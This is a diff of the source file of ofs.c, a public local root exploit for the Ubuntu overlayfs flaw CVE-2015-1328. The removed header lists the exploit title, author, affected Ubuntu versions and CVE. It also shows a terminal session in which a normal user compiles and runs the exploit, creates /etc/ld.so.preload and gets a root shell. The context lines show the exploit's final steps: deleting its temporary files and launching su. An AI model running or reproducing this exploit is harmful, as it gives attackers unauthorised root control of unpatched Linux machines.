@@ -1,36 +1,3 @@
-/*
-# Exploit Title: ofs.c - overlayfs local root in ubuntu
-# Date: 2015-06-15
-# Exploit Author: rebel
-# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
-# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
-# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)
-
-*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
-CVE-2015-1328 / ofs.c
-overlayfs incorrect permission handling + FS_USERNS_MOUNT
-
-user@ubuntu-server-1504:~$ uname -a
-Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
-user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
-user@ubuntu-server-1504:~$ id
-uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
-user@ubuntu-server-1504:~$ ./ofs
-spawning threads
-mount #1
-mount #2
-child threads done
-/etc/ld.so.preload created
-creating shared library
-# id
-uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)
-
-greets to beist & kaliman
-2015-05-24
-%rebel%
-*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
-*/
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -149,4 +116,5 @@ main(int argc, char **argv)
     close(fd);
     system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
     execl("/bin/su","su",NULL);
+
 }
